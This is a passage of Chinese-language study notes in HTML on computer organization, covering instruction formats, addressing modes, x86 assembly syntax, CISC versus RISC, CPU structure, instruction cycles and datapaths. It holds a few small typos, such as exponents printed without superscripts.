<li>对于常用的算术和逻辑运算指令，往往要求使用两个操作数，需分别给出目的操作数和源操作数的地址，其中目的操作数地址还用于保存本次的运算结果</li>
<li>若指令字长为 <code>32</code> 位，操作码占 <code>8</code> 位，两个地址码字段各占 <code>12</code> 位，则指令操作数的直接寻址范围为 2<sup>12</sup> = 4K</li>
</ul>
</li>
<li>
<p><strong>三地址指令</strong></p>
<p>给出 <strong>操作码 OP</strong>，三个地址码 A<sub>1</sub>、A<sub>2</sub> 和 A<sub>3</sub>（结果）。</p>
<ul>
<li>指令含义：(A<sub>1</sub>)OP(A<sub>2</sub>)→A<sub>3</sub></li>
<li>若指令字长为 <code>32</code> 位，操作码占 <code>8</code> 位，三个地址码字段各占 <code>8</code> 位，则指令操作数的直接寻址范围为 <code>28 = 256</code>。若地址字段均为主存地址，则完成一条三地址需要 <code>4</code> 次访问存储器（取指令 <code>1</code> 次，取两个操作数 <code>2</code> 次，存放结果 <code>1</code> 次）</li>
</ul>
</li>
<li>
<p><strong>四地址指令</strong></p>
<p>给出 <strong>操作码 OP</strong>，四个地址码 A<sub>1</sub>、A<sub>2</sub>、A<sub>3</sub>（结果）和 A<sub>4</sub>（下址）。</p>
<ul>
<li>指令含义：(A<sub>1</sub>)OP(A<sub>2</sub>)→A<sub>3</sub>，A<sub>4</sub> = 下一条将要执行指令的地址</li>
<li>若指令字长为 <code>32</code> 位，操作码占 <code>8</code> 位，四个地址码字段各占 <code>6</code> 位，则指令操作数的直接寻址范围为 <code>26 = 64</code></li>
</ul>
</li>
</ol>
<h4> 定长操作码指令格式</h4>
<p>定长操作码指令在指令字的最高位部分分配固定的若干位（定长）表示操作码。一般 <code>n</code> 位操作码字段的指令系统最大能够表示 2<sup>n</sup> 条指令。定长操作码对于简化计算机硬件设计，提高指令译码和识别速度很有利。当计算机字长为 <code>32</code> 位或更长时，这是常规用法。</p>
<h4> 扩展操作码指令格式</h4>
<p>为了在指令字长有限的前提下仍保持比较丰富的指令种类，可采取 <strong>可变长度操作码</strong>，即全部指令的操作码字段的位数不固定，且分散地放在指令字的不同位置上。显然，这将增加指令译码和分析的难度，使控制器的设计复杂化。</p>
<p>最常见的变长操作码方法是扩展操作码，它使操作码的长度随地址码的减少而增加，不同地址数的指令可具有不同长度的操作码，从而在满足需要的前提下，有效地缩短指令字长。</p>
<p>在设计扩展操作码指令格式时，必须注意以下两点：</p>
<ol>
<li>不允许短码是长码的前缀，即短操作码不能与长操作码的前面部分的代码相同。</li>
<li>各指令的操作码一定不能重复。</li>
</ol>
<p>通常情况下，对使用频率较高的指令分配较短的操作码，对使用频率较低的指令分配较长的操作码，从而尽可能减少指令译码和分析的时间。</p>
<h4> 指令的操作类型</h4>
<p>设计指令系统时必须考虑应提供哪些操作类型，指令操作类型按功能可分为以下几种：</p>
<ol>
<li>
<p><strong>数据传送</strong></p>
<p>传送指令通常有寄存器之间的传送（MOV）、从内存单元读取数据到 CPU 寄存器（LOAD）、从 CPU 寄存器写数据到内存单元（STORE）等。</p>
</li>
<li>
<p><strong>算术和逻辑运算</strong></p>
<p>这类指令主要有加（ADD）、减（SUB）、比较（CMP）、乘（MUL）、除（DIV）、加1（INC）、减1（DEC）、与（AND）、或（OR）、取反（NOT）、异或（XOR）等。</p>
</li>
<li>
<p><strong>移位操作</strong></p>
<p>移位指令主要有算术移位、逻辑移位、循环移位等。</p>
</li>
<li>
<p><strong>转移操作</strong></p>
<p>转移指令主要有无条件转移（JMP）、条件转移（BRANCH）、调用（CALL）、返回（RET）、陷阱（TRAP）等。无条件转移指令在任何情况下都执行转移操作，而条件转移指令仅在特定条件满足时才执行转移操作，转移条件一般是某个标志位的值，或几个标志位的组合。</p>
<p>调用指令和转移指令的区别：执行调用指令时必须保存下一条指令的地址（返回地址），当子程序执行结束时，根据返回地址返回到主程序继续执行；而转移指令则不返回执行。</p>
</li>
<li>
<p><strong>输入输出操作</strong></p>
<p>这类指令用于完成 CPU 与外部设备交换数据或传送控制命令及状态信息。</p>
</li>
</ol>
<h3> 指令的寻址方式</h3>
<p>寻址方式是指寻找指令或操作数有效地址的方式，即 <strong>确定本条指令的数据地址及下一条待执行指令的地址</strong> 的方法。</p>
<p>指令中的地址码字段并不代表操作数的真实地址，这种地址称为 <strong>形式地址（A）</strong>。形式地址结合寻址方式，可以计算出操作数在存储器中的真实地址，这种地址称为 <strong>有效地址（EA）。</strong></p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>（A）表示地址为 A 的数值，A 既可以是寄存器编号，也可以是内存地址。对应的（A）就是寄存器中的数值，或相应内存单元的数值。例如：EA=(A) 意思是有效地址是地址 A 中的数值</p>
</div>
<h4> 指令寻址和数据寻址</h4>
<p>寻址方式分为指令寻址和数据寻址两大类。<strong>寻找下一条将要执行的指令地址</strong> 称为指令寻址；<strong>寻找本条指令的数据地址</strong> 称为数据寻址。</p>
<ol>
<li>
<p><strong>指令寻址</strong></p>
<p>指令寻址方式有两种：</p>
<ul>
<li><strong>顺序寻址</strong>：通过程序计数器 PC 加 1（<code>1</code> 个指令字长），自动形成下一条指令的地址</li>
<li><strong>跳跃寻址</strong>：通过转移类指令实现。所谓跳跃，是指下条指令的地址不由程序计数器 PC 自动给出，而由本条指令给出下条指令地址的计算方式。而是否跳跃可能受到状态寄存器和操作数的控制，跳跃的地址分为绝对地址（由标记符直接得到）和相对地址（相对于当前指令地址的偏移量），跳跃的结果是当前指令修改 PC 值，所以下一条指令仍然通过 PC 给出</li>
</ul>
</li>
<li>
<p><strong>数据寻址</strong></p>
<p>数据寻址是指如何在指令中表示一个操作数的地址，如何用这种表示得到操作数或怎样计算出操作数的地址。</p>
<p>数据寻址的方式较多，为区别各种方式，通常在指令字中设一个字段，用来指明属于哪种寻址方式，由此可得指令的格式：<em>操作码 + 寻址特征 + 形式地址 A</em></p>
</li>
</ol>
<h4> 常见的数据寻址方式</h4>
<ol>
<li>
<p><strong>隐含寻址</strong></p>
<p>这种类型的指令不明显地给出操作数的地址，而在指令中隐含操作数的地址。</p>
<p><strong>优点</strong> 是有利于缩短指令字长；<strong>缺点</strong> 是需增加存储操作数或隐含地址的硬件。</p>
</li>
<li>
<p><strong>立即（数）寻址</strong></p>
<p>这种类型指令的地址字段指出的不是操作数的地址，而是操作数本身，又称立即数，采用补码表示。</p>
<p><strong>优点</strong> 是指令在执行阶段不访问主存，指令执行时间最短；<strong>缺点</strong> 是 A 的位数限制了立即数的范围。</p>
</li>
<li>
<p><strong>直接寻址</strong></p>
<p>指令字中的形式地址 A 是操作数的真实地址 EA，即 <code>EA = A</code>。</p>
<p><strong>优点</strong> 是简单，指令在执行阶段仅访问一次主存，不需要专门计算操作数的地址；<strong>缺点</strong> 是 A 的位数决定了该指令操作数的寻址范围，操作数的地址不易修改。</p>
</li>
<li>
<p><strong>间接寻址</strong></p>
<p>指令的地址字段给出的形式地址不是操作数的真正地址，而是操作数有效地址所在的存储单元的地址，也就是操作数地址的地址，即 <code>EA = (A)</code>。间接寻址可以是一次间接寻址，还可以是多次间接寻址。</p>
<p><strong>优点</strong> 是可扩大寻址范围（有效地址 EA 的位数大于形式地址 A 的位数），便于编制程序（用间接寻址可方便地完成子程序返回）；<strong>缺点</strong> 是指令在执行阶段要多次访存（一次间接寻址需两次访存，多次间接寻址需根据存储字的最高位确定访存次数）。</p>
</li>
<li>
<p><strong>寄存器寻址</strong></p>
<p>指在指令字中直接给出操作数所在的寄存器编号，即 EA = R<sub>i</sub>，其操作数在由 R<sub>i</sub> 所指的寄存器内。</p>
<p><strong>优点</strong> 是指令在执行阶段不访问主存，只访问寄存器，因寄存器数量较少，对应地址码长度较小，使得指令字短且因不用访存，所以执行速度快，支持向量/矩阵运算；<strong>缺点</strong> 是寄存器价格昂贵，计算机中的寄存器个数有限。</p>
</li>
<li>
<p><strong>寄存器间接寻址</strong></p>
<p>指在寄存器 R<sub>i</sub> 中给出的不是一个操作数，而是操作数所在主存单元的地址，即 EA = (R<sub>i</sub>)。</p>
<p>寄存器间接寻址的 <strong>特点</strong> 是，与一般间接寻址相比速度更快，但指令的执行阶段需要访问主存（因为操作数在主存中）。</p>
</li>
<li>
<p><strong>相对寻址</strong></p>
<p>把 PC 的内容加上指令格式中的形式地址 A 而形成操作数的有效地址，即 <code>EA = (PC) + A</code>，其中 A 是相对于 PC 所指地址的位移量，可正可负，补码表示。</p>
<p><strong>优点</strong> 是操作数的地址不是固定的，它随 PC 值的变化而变化，且与指令地址之间总是相差一个固定值，因此便于程序浮动。相对寻址广泛应用于转移指令（JMPA）。</p>
</li>
<li>
<p><strong>基址寻址</strong></p>
<p>指将 CPU 中基址寄存器（BR）的内容加上指令格式中的形式地址 A 而形成操作数的有效地址，即 <code>EA = (BR) + A</code>。其中基址寄存器既可采用专用寄存器，又可采用通用寄存器。基址寄存器是面向操作系统的，其内容由操作系统或管理程序确定，主要用于解决程序逻辑空间与存储器物理空间的无关性。</p>
<p><strong>优点</strong> 是可扩大寻址范围（基址寄存器的位数大于形式地址 A 的位数）；用户不必考虑自己的程序存于主存的哪个空间区域，因此有利于多道程序设计，并可用于编制浮动程序，但偏移量（形式地址 A）的位数较短。</p>
</li>
<li>
<p><strong>变址寻址</strong></p>
<p>指有效地址 EA 等于指令字中的形式地址 A 与变址寄存器 IX 的内容之和，即 <code>EA = (IX) + A</code>，其中 IX 为变址寄存器（专用），也可用通用寄存器作为变址寄存器，变址寄存器是面向用户的。</p>
<p><strong>优点</strong> 是可扩大寻址范围（变址寄存器的位数大于形式地址 A 的位数）；在数组处理过程中，可设定 A 为数组的首地址，不断改变变址寄存器 IX 的内容，便可很容易形成数组中任意一个数据的地址，特别适合编制循环程序。偏移量（变址寄存器 IX）的位数足以表示整个存储空间。</p>
</li>
<li>
<p><strong>堆栈寻址</strong></p>
<p>堆栈是存储器（或专用寄存器组）中一块特定的、按后进先出（LIFO）原则管理的存储区，该存储区中读/写单元的地址是用一个特定的寄存器给出的，该寄存器称为堆栈指针（SP）。堆栈可分为硬堆栈与软堆栈两种。</p>
<p><strong>硬堆栈</strong>：寄存器堆栈的成本较高，不适合做大容量的堆栈；<strong>软堆栈</strong>：从主存中划出一段区域来做堆栈是最合算且最常用的方法。</p>
</li>
</ol>
<p>简单总结寻址方式、有效地址及访存次数（不含取本条指令的访存）：</p>
<table>
<thead>
<tr>
<th style="text-align:center">寻址方式</th>
<th style="text-align:center">有效地址</th>
<th style="text-align:center">访存次数</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">隐含寻址</td>
<td style="text-align:center">程序指定</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">立即导址</td>
<td style="text-align:center">A 即是操作数</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">直接导址</td>
<td style="text-align:center">EA = A</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">一次间接导址</td>
<td style="text-align:center">EA = (A)</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:center">寄存器寻址</td>
<td style="text-align:center">EA = R<sub>i</sub></td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">寄存器间接一次寻址</td>
<td style="text-align:center">EA = (R<sub>i</sub>)</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">相对寻址</td>
<td style="text-align:center">EA = (PC) + A</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">基址寻址</td>
<td style="text-align:center">EA = (BR) + A</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">变址寻址</td>
<td style="text-align:center">EA = (IX) + A</td>
<td style="text-align:center">1</td>
</tr>
</tbody>
</table>
<h3> 程序的机器级代码表示</h3>
<h4> 常用汇编指令介绍</h4>
<ol>
<li>
<p><strong>相关寄存器</strong></p>
<p><code>x86</code> 处理器中有 <code>8</code> 个 <code>32</code> 位的通用寄存器，EAX 累加器、EBX 基地址寄存器、ECX 计数寄存器、EDX 数据寄存器、ESI 和 EDI 编址寄存器、EBP 堆栈基指针、ESP 堆栈顶指针。为了向后兼容，EAX、EBX、ECX 和 EDX 的高两位字节和低两位字节可以独立使用，<code>E</code> 为 <code>Extended</code>，表示 <code>32</code> 位的寄存器。例如：EAX 的低两位字节称为 AX，而 AX 的高低字节又可分别作为两个 <code>8</code> 位寄存器，分别称为 AH 和 AL。</p>
<p>除 EBP 和 ESP 外，其他几个寄存器的用途是比较任意的。</p>
</li>
<li>
<p><strong>汇编指令格式</strong></p>
<p>使用不同的编程工具开发程序时，用到的汇编程序也不同，一般有两种不同的汇编格式，<code>AT&amp;T</code>（Unix、Linux 常用格式）和 <code>Inter</code>（Windows 常用格式）。区别如下：</p>
<ul>
<li><code>AT&amp;T</code> 格式的指令只能用小写字母，而 <code>Intel</code> 格式的指令对大小写不敏感</li>
<li>在 <code>AT&amp;T</code> 格式中，第一个为源操作数，第二个为目的操作数，方向从左到右，合乎自然；在 <code>Intel</code> 格式中，第一个为目的操作数，第二个为源操作数，方向从右向左</li>
<li>在 <code>AT&amp;T</code> 格式中，寄存器需要加前缀 <code>%</code>，立即数需要加前缀 <code>$</code>；在 <code>Intel</code> 格式中，寄存器和立即数都不需要加前缀</li>
<li>在内存寻址方面，<code>AT&amp;T</code> 格式使用 <code>(</code> 和 <code>)</code>，而 <code>Intel</code> 格式使用 <code>[</code> 和 <code>]</code>。在处理复杂寻址方式时，例如：<code>AT&amp;T</code> 格式的内存操作数 <code>disp(base, index, scale)</code> 分别表示偏移量、基址寄存器、变址寄存器和比例因子，如 <code>8(%edx, %eax, 2)</code> 表示操作数为 <code>M[R[edx] + R[eax]*2 + 8]</code>，其对应的 <code>Intel</code> 格式的操作数为 <code>[edx + eax*2 + 8]</code></li>
<li>在指定数据长度方面，<code>AT&amp;T</code> 格式指令操作码的后面紧跟一个字符，表明操作数大小，<code>b</code> 表示 byte（字节）、<code>w</code> 表示 word（字）或 <code>l</code> 表示 long（双字）。<code>Intel</code> 格式也有类似的语法，它在操作码后面显式地注明 byte ptr、word ptr 或 dword ptr</li>
</ul>
<div class="hint-container warning">
<p class="hint-container-title">注意</p>
<p>由于 <code>32</code> 或 <code>64</code> 位体系结构都是由 <code>16</code> 位扩展而来的，因此用 word（字）表示 <code>16</code> 位</p>
</div>
</li>
</ol>
<h4> 选择语句的机器级表示</h4>
<p>常见的选择结构语句有 <code>if-then</code>、<code>if-then-else</code>、<code>case</code>（或 <code>switch</code>）等。编译器通过条件码（标志位）设置指令和各类转移指令来实现程序中的选择结构语句。</p>
<h4> 循环语句的机器级表示</h4>
<p>常见的循环结构语句有 <code>while</code>、<code>for</code> 和 <code>do-while</code>。汇编中没有相应的指令存在，可以用条件测试和转跳组合起来实现循环的效果，大多数编译器将这三种循环结构都转换为 <code>do-while</code> 形式来产生机器代码。在循环结构中，通常使用条件转移指令来判断循环条件的结束。</p>
<h3> CISC 和 RISC 的基本概念</h3>
<p>指令系统朝两个截然不同的方向的发展：</p>
<ol>
<li>增强原有指令的功能，设置更为复杂的新指令实现软件功能的硬化，这类机器称为复杂指令系统计算机（CISC），典型的有采用 <code>x86</code> 架构的计算机</li>
<li>减少指令种类和简化指令功能，提高指令的执行速度，这类机器称为精简指令系统计算机（RISC），典型的有 ARM、MIPS 架构的计算机</li>
</ol>
<h4> 复杂指令系统计算机（CISC）</h4>
<p>随着 VLSI 技术的发展，硬件成本不断下降，软件成本不断上升，促使人们在指令系统中增加更多、更复杂的指令，以适应不同的应用领域，这样就构成了复杂指令系统计算机（CISC）。</p>
<p><strong>CISC 的主要特点如下：</strong></p>
<ul>
<li>指令系统复杂庞大，指令数目一般为 200 条以上</li>
<li>指令的长度不固定，指令格式多，寻址方式多</li>
<li>可以访存的指令不受限制</li>
<li>各种指令使用频度相差很大</li>
<li>各种指含执行时间相差很大，大多数指令需多个时钟周期才能完成</li>
<li>控制器大多数采用微程序控制。有些指令非常复杂，以至于无法采用硬连线控制</li>
<li>难以用优化编译生成高效的目标代码程序</li>
</ul>
<p>如此庞大的指令系统，对指令的设计提出了极高的要求，研制周期变得很长。后来人们发现，一味地追求指令系统的复杂和完备程度不是提高计算机性能的唯一途径。</p>
<h4> 精简指令系统计算机（RISC）</h4>
<p>精简指令系统计算机（RISC）的中心思想是要求指令系统简化，尽量使用寄存器-寄存器操作指令，指令格式力求一致。</p>
<p><strong>RISC 的主要特点如下：</strong></p>
<ul>
<li>选取使用频率最高的一些简单指令，复杂指令的功能由简单指令的组合来实现</li>
<li>指令长度固定，指令格式种类少，寻址方式种类少</li>
<li>只有 Load/Store（取数/存数）指令访存，其余指令的操作都在寄存器之间进行</li>
<li>CPU 中通用寄存器的数量相当多</li>
<li>RISC 一定采用指令流水线技术，大部分指令在一个时钟周期内完成</li>
<li>以硬布线控制为主，不用或少用微程序控制</li>
<li>特别重视编译优化工作，以减少程序执行时间</li>
</ul>
<p>值得注意的是，从指令系统兼容性看，CISC 大多能实现软件兼容，即高档机包含了低档机的全部指令，并可加以扩充。但 RISC 简化了指令系统，指令条数少，格式也不同于老机器，因此大多数 RISC 机不能与老机器兼容。由于 RISC 具有更强的实用性，因此应该是未来处理器的发展方向。但事实上，当今时代 Intel 几乎一统江湖，且早期很多软件都是根据 CISC 设计的，单纯的 RISC 将无法兼容。此外，现代 CISC 结构的 CPU 已经融合了很多 RISC 的成分，其性能差距已经越来越小。CISC 可以提供更多的功能，这是程序设计所需要的。</p>
<h4> CISC 和 RISC 的比较</h4>
<table>
<thead>
<tr>
<th style="text-align:center">对比项目</th>
<th style="text-align:center">CISC</th>
<th style="text-align:center">RISC</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">指令系统</td>
<td style="text-align:center">复杂，庞大</td>
<td style="text-align:center">简单，精简</td>
</tr>
<tr>
<td style="text-align:center">指令数目</td>
<td style="text-align:center">一般大于 200 条</td>
<td style="text-align:center">般小于 100 条</td>
</tr>
<tr>
<td style="text-align:center">指令字长</td>
<td style="text-align:center">不固定</td>
<td style="text-align:center">定长</td>
</tr>
<tr>
<td style="text-align:center">可访存指令</td>
<td style="text-align:center">不加限制</td>
<td style="text-align:center">只有 Load/Store 指令</td>
</tr>
<tr>
<td style="text-align:center">各种指令执行时间</td>
<td style="text-align:center">相差较大</td>
<td style="text-align:center">绝大多数在一个周期内完成</td>
</tr>
<tr>
<td style="text-align:center">各种指令使用频度</td>
<td style="text-align:center">相差很大</td>
<td style="text-align:center">都比较常用</td>
</tr>
<tr>
<td style="text-align:center">通用寄存器数量</td>
<td style="text-align:center">较少</td>
<td style="text-align:center">多</td>
</tr>
<tr>
<td style="text-align:center">目标代码</td>
<td style="text-align:center">难以用优化编译生成高效的目标代码程序</td>
<td style="text-align:center">采用优化的编译程序，生成代码较为高效</td>
</tr>
<tr>
<td style="text-align:center">控制方式</td>
<td style="text-align:center">绝大多数为微程序控制</td>
<td style="text-align:center">绝大多数为组合逻辑控制</td>
</tr>
<tr>
<td style="text-align:center">指令流水线</td>
<td style="text-align:center">可以通过一定方式实现</td>
<td style="text-align:center">必须实现</td>
</tr>
</tbody>
</table>
<h2> 中央处理器</h2>
<h3> CPU 的功能和基本结构</h3>
<h4> CPU 的功能</h4>
<p>中央处理器（CPU）由运算器和控制器组成。其中，控制器的功能是负责协调并控制计算机各部件执行程序的指令序列，包括取指令、分析指令和执行指令；运算器的功能是对数据进行加工。</p>
<p><strong>CPU 的具体功能包括：</strong></p>
<ul>
<li><strong>指令控制</strong>：完成取指令、分析指令和执行指令的操作，即程序的顺序控制</li>
<li><strong>操作控制</strong>：一条指令的功能往往由若干操作信号的组合来实现。CPU 管理并产生由内存取出的每条指令的操作信号，把各种操作信号送往相应的部件，从而控制这些部件按指令的要求进行动作</li>
<li><strong>时间控制</strong>：对各种操作加以时间上的控制。时间控制要为每条指令按时间顺序提供应有的控制信号</li>
<li><strong>数据加工</strong>：对数据进行算术和逻辑运算</li>
<li><strong>中断处理</strong>：对计算机运行过程中出现的异常情况和特殊请求进行处理</li>
</ul>
<h4> CPU 的基本结构</h4>
<ol>
<li>
<p><strong>运算器</strong></p>
<p>运算器接收从控制器送来的命令并执行相应的动作，对数据进行加工和处理。运算器是计算机对数据进行加工处理的中心。</p>
<p><strong>运算器组成：</strong></p>
<ul>
<li><strong>算术逻辑单元（ALU）</strong>：主要功能是进行算术/逻辑运算</li>
<li><strong>暂存寄存器</strong>：用于暂存从主存读来的数据，该数据不能存放在通用寄存器中，否则会破坏其原有内容。暂存寄存器对应用程序员是透明的</li>
<li><strong>累加寄存器（ACC）</strong>：它是一个通用寄存器，用于暂时存放 ALU 运算的结果信息，可以作为加法运算的一个输入端</li>
<li><strong>通用寄存器组</strong>：如：AX、BX、CX、DX、SP 等，用于存放操作数（包括源操作数、目的操作数及中间结果）和各种地址信息等。SP 是堆栈指针，用于指示栈顶的地址</li>
<li><strong>程序状态字寄存器（PSW）</strong>：保留由算术逻辑运算指令或测试指令的结果而建立的各种状态信息，如：溢出标志（OF）、符号标志（SF）、零标志（ZF）、进位标志（CF）等。PSW 中的这些位参与并决定微操作的形成</li>
<li><strong>移位器</strong>：对操作数或运算结果进行移位运算</li>
<li><strong>计数器（CT）</strong>：控制乘除运算的操作步数</li>
</ul>
</li>
<li>
<p><strong>控制器</strong></p>
<p>控制器是整个系统的指挥中枢，在控制器的控制下，运算器、存储器和输入/输出设备等功能部件构成一个有机的整体，根据指令的要求指挥全机协调工作。控制器的基本功能是执行指令，每条指令的执行是由控制器发出的一组微操作实现的。</p>
<p>控制器有硬布线控制器和微程序控制器两种类型。</p>
<p><strong>控制器组成：</strong></p>
<ul>
<li><strong>程序计数器（PC）</strong>：用于指出欲执行指令在主存中的存放地址。CPU 根据 PC 的内容去主存中取指令。因程序中指令（通常）是顺序执行的，所以 PC 有自增功能</li>
<li><strong>指令寄存器（IR）</strong>：用于保存当前正在执行的那条指令</li>
<li><strong>指令译码器</strong>：仅对操作码字段进行译码，向控制器提供特定的操作信号</li>
<li><strong>存储器地址寄存器（MAR）</strong>：用于存放要访问的主存单元的地址</li>
<li><strong>存储器数据寄存器（MDR）</strong>：用于存放向主存写入的信息或从主存读出的信息</li>
<li><strong>时序系统</strong>：用于产生各种时序信号，它们都由统一时钟（CLOCK）分频得到</li>
<li><strong>微操作信号发生器</strong>：根据 IR 的内容（指令）、PSW 的内容（状态信息）及时序信号，产生控制整个计算机系统所需的各种控制信号，其结构有组合逻辑型和存储逻辑型两种</li>
</ul>
<p>控制器的工作原理是，根据指令操作码、指令的执行步骤（微命令序列）和条件信号来形成当前计算机各部件要用到的控制信号。计算机整机各硬件系统在这些控制信号的控制下协同运产生预期的执行结果。</p>
</li>
</ol>
<h3> 指令执行过程</h3>
<h4> 指令周期</h4>
<p><strong>CPU 从主存中取出并执行一条指令的时间</strong> 称为指令周期，不同指令的指令周期可能不同。指令周期常用若干机器周期来表示，一个机器周期又包含若干时钟周期（也称节拍或 <code>T</code> 周期，它是 CPU 操作的最基本单位）。每个指令周期内的机器周期数可以不等，每个机器周期内的节拍数也可以不等。</p>
<p>对于无条件转移指令 JMP X，在执行时不需要访问主存，只包含取指阶段（包括取指和分析）和执行阶段，所以其指令周期仅包含 <strong>取指周期</strong> 和 <strong>执行周期。</strong></p>
<p>对于间接寻址的指令，为了取操作数，需要先访问一次主存，取出有效地址，然后访问主存，取出操作数，所以还需包括 <strong>间址周期</strong>。间址周期介于取指周期和执行周期之间。</p>
<p>当 CPU 采用中断方式实现主机和 <code>I/O</code> 设备的信息交换时，CPU 在每条指令执行结束前，都要发中断查询信号，若有中断请求，则 CPU 进入中断响应阶段，又称 <strong>中断周期</strong>。这样，一个完整的指令周期应包括取指、间址、执行和中断四个周期。</p>
<p>四个工作周期都有 CPU 访存操作，只是访存的目的不同。取指周期是为了取指令，间址周期是为了取有效地址，执行周期是为了取操作数，中断周期是为了保存程序断点。</p>
<p>为了区别不同的工作周期，在 CPU 内设置四个标志触发器 FE、IND、EX 和 INT，它们分别对应取指、间址、执行和中断周期，并以 <code>1</code> 状态表示有效，分别由 1→FE、1→IND、1→EX 和 1→INT 这四个信号控制。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>中断周期中的进栈操作是将 SP 减 <code>1</code>，这和传统意义上的进栈操作相反，原因是计算机的堆栈中都是向低地址增加，所以进栈操作是减 <code>1</code> 而不是加 <code>1</code></p>
</div>
<h4> 指令周期的数据流</h4>
<p>数据流是根据指令要求依次访问的数据序列。在指令执行的不同阶段，要求依次访问的数据序列是不同的。而且对于不同的指令，它们的数据流往往也是不同的。</p>
<ol>
<li>
<p><strong>取指周期</strong></p>
<p>取指周期的任务是根据 PC 中的内容从主存中取出指令代码并存放在 IR 中。PC 中存放的是指令的地址，根据此地址从内存单元中取出的是指令，并放在指令寄存器 IR 中，取指令的同时 PC 加 <code>1</code>。</p>
<p><strong>取指周期的数据流向如下：</strong></p>
<ul>
<li>PC -&gt; MAR -&gt; 地址总线 -&gt; 主存</li>
<li>控制单元（CU） 发出读命令 -&gt; 控制总线 -&gt; 主存</li>
<li>主存 -&gt; 数据总线 -&gt; MDR -&gt; IR（存放指令）</li>
<li>CU 发出控制信号 -&gt; PC 内容加 1</li>
</ul>
</li>
<li>
<p><strong>间址周期</strong></p>
<p>间址周期的任务是取操作数有效地址。将指令中的地址码送到 MAR 并送至地址总线，此后 CU 向存储器发读命令，以获取有效地址并存至 MDR。</p>
<p><strong>间址周期的数据流向如下：</strong></p>
<ul>
<li>Ad(IR)（或 MDR） -&gt; MAR -&gt; 地址总线主存</li>
<li>CU 发出读命令 -&gt; 控制总线 -&gt; 主存</li>
<li>主存 -&gt; 数据总线 -&gt; MDR（存放有效地址）</li>
</ul>
<p>其中，Ad(IR) 表示取出 IR 中存放的指令字的地址字段。</p>
</li>
<li>
<p><strong>执行周期</strong></p>
<p>执行周期的任务是取操作数，并根据 IR 中的指令字的操作码通过 ALU 操作产生执行结果。不同指令的执行周期操作不同，因此没有统一的数据流向。</p>
</li>
<li>
<p><strong>中断周期</strong></p>
<p>中断周期的任务是处理中断请求。假设程序断点存入堆栈中，并用 SP 指示栈顶地址，而且进栈操作是先修改栈顶指针，后存入数据。</p>
<p><strong>中断周期的数据流向如下：</strong></p>
<ul>
<li>CU 控制将 SP 减 1，SP -&gt; MAR -&gt; 地址总线 -&gt; 主存</li>
<li>CU 发出写命令 -&gt; 控制总线 -&gt; 主存</li>
<li>PC -&gt; MDR -&gt; 数据总线 -&gt; 主存（程序断点存入主存）</li>
<li>CU（中断服务程序的入口地址） -&gt; PC</li>
</ul>
</li>
</ol>
<h4> 指令执行方案</h4>
<p>一个指令周期通常要包括几个时间段（执行步骤），每个步骤完成指令的一部分功能，几个依次执行的步骤完成这条指令的全部功能。出于性能和硬件成本等考虑，可以选用三种不同的方案来安排指令的执行步骤。</p>
<ol>
<li>
<p><strong>单指令周期</strong></p>
<p>对所有指令都选用相同的执行时间来完成，称为单指令周期方案。此时每条指令都在一个时钟周期内完成，指令之间串行执行，即下一条指令只能在前一条指令执行结束后才能启动。因此，时钟周期取决于执行时间最长的指令的执行时间。对于那些本来可以在更短时间内完成的指令，要使用这个较长的周期来完成，会降低整个系统的运行速度。</p>
</li>
<li>
<p><strong>多指令周期</strong></p>
<p>对不同类型的指令选用不同的执行步骤，称为多指令周期方案。指令之间串行执行，即下条指令只能在前一指令执行完后才能启动。但可选用不同个数的时钟周期来完成不同指令的执行过程，指令需要几个周期就为其分配几个周期，不再要求所有指令占用相同的执行时间。</p>
</li>
<li>
<p><strong>流水线方案</strong></p>
<p>指令之间可以并行执行的方案，称为流水线方案，其追求的目标是力争在每个时钟脉冲周期完成一条指令的执行过程（只在理想情况下才能达到该效果）。这种方案通过在每个时钟周期启动一条指令，尽量让多条指令同时运行，但各自处在不同的执行步骤中。</p>
</li>
</ol>
<h3> 数据通路的功能和基本结构</h3>
<h4> 数据通路的功能</h4>
<p><strong>数据在功能部件之间传送的路径</strong> 称为数据通路，包括数据通路上流经的部件，如：ALU、通用寄存器、状态寄存器、异常和中断处理逻辑等。数据通路描述了信息从什么地方开始，中间经过哪个寄存器或多路开关，最后传送到哪个寄存器，这些都需要加以控制。</p>
<p>数据通路由控制部件控制，控制部件根据每条指令功能的不同生成对数据通路的控制信号。数据通路的 <strong>功能</strong> 是实现 CPU 内部的运算器与寄存器及寄存器之间的数据交换。</p>
<h4> 数据通路的基本结构</h4>
<p>数据通路的基本结构主要有以下几种：</p>
<ul>
<li><strong>CPU 内部单总线方式</strong>：将所有寄存器的输入端和输出端都连接到一条公共通路上，这种结构比较简单，但数据传输存在较多的冲突现象，性能较低</li>
<li><strong>CPU 内部多总线方式</strong>：将所有寄存器的输入端和输出端都连接到多条公共通路上，相比之下单总线中一个时钟内只允许传一个数据，因而指令执行效率很低，因此采用多总线方式，同时在多个总线上传送不同的数据，提高效率</li>
<li><strong>专用数据通路方式</strong>：根据指令执行过程中的数据和地址的流动方向安排连接线路，避免使用共享的总线，性能较高，但硬件量大</li>
</ul>
<ol>
<li>
<p><strong>寄存器之间的数据传送</strong></p>
<p>寄存器之间的数据传送可通过 CPU 内部总线完成。</p>
</li>
<li>
<p><strong>主存与 CPU 之间的数据传送</strong></p>
<p>主存与 CPU 之间的数据传送也要借助 CPU 内部总线完成。</p>
</li>
<li>
<p><strong>执行算术或逻辑运算</strong></p>
<p>执行算术或逻辑操作时，由于 ALU 本身是没有内部存储功能的组合电路，因此如要执行加法运算，相加的两个数必须在 ALU 的两个输入端同时有效。</p>
</li>
</ol>
<p>数据通路结构直接影响 CPU 内各种信息的传送路径，数据通路不同，指令执行过程的微操作序列的安排也不同，它关系着微操作信号形成部件的设计。</p>
